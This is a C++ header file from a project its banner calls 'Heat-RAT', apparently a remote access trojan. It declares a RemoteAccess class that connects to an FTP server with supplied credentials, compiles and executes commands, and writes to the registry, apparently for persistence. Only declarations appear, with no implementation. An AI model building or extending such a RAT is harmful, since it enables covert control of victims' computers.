/*
##########################################################################################################################
|....######....##.............######.....###...............####################.............######......###..............|
|....######....##.............#####.......##...............#.######.######.####..............#####.......##..............|
|..............##.....############.........######....#####.....##.....##.....##....#####.....####.........######....#####|
|..............##.............###.....#.....#####.....####.....##.....##.....##.............####.....#....######....#####|
|..............##.............###............####.....#########################...........#####............#####....#####|
|....######....##.....##########..............###.....########################....##.......##..............#####....#####|
|....#####.....##..............................##.....####.....##.....##.....##....####......................###....#####|
|....######....##..................#######.....##.....####.....##.....##.....##....#####..........#######....###....#####|
|                                                    by: Nick_Vinesmoke                                                  |
|                                             https://github.com/Nick-Vinesmoke                                          |
|                                        https://github.com/Nick-Vinesmoke/Heat-RAT                                      |
##########################################################################################################################
*/

#pragma once

#include "FtpConnect.h"
#include "WinApi.h"
#include <exception>




/**
 * @brief Represents a class for remote access functionality.
 *
 * The RemoteAccess class provides functionality for remote access, including
 * setup, compilation, execution, and registry modification.
 *
 * Usage:
 * - Create an instance by providing FTP credentials (host, username, password).
 * - Call the start method to initiate the remote access functionality.
 *
 * Note: This class assumes the existence of the FtpConnect class for FTP connection.
 */
class RemoteAccess
{

public:
    /**
     * @brief Constructor for RemoteAccess class.
     *
     * @param host The FTP host address.
     * @param username The FTP username.
     * @param password The FTP password.
     */
    RemoteAccess(const std::string& host, const std::string& username, const std::string& password);

    /**
     * @brief Destructor for RemoteAccess class.
     */
    ~RemoteAccess();

    /**
     * @brief Initiates the remote access functionality.
     *
     * This method performs setup, compilation, execution, and registry modification
     * to enable remote access functionality.
     */
    void start();

private:
    /**
     * @brief Performs initial setup for remote access.
     */
    void setup();

    /**
     * @brief Compiles a file at the specified path.
     *
     * @param file_path The path of the file to be compiled.
     */
    void compile(const std::string& file_path);

    /**
     * @brief Executes a command based on a vector of strings.
     *
     * @param spl_line The vector of strings representing the command.
     */
    void execute(const std::vector<std::string>& spl_line);

    /**
     * @brief Adds necessary configurations to the registry.
     */
    void add_to_reg();

private:
    std::string ftp_host;
    std::string ftp_username;
    std::string ftp_password;

    FtpConnect ftp_connection;

    std::string win_username;
    std::string store_path;
    std::string data_path;
    std::string app_path;
    std::string output_path;

};
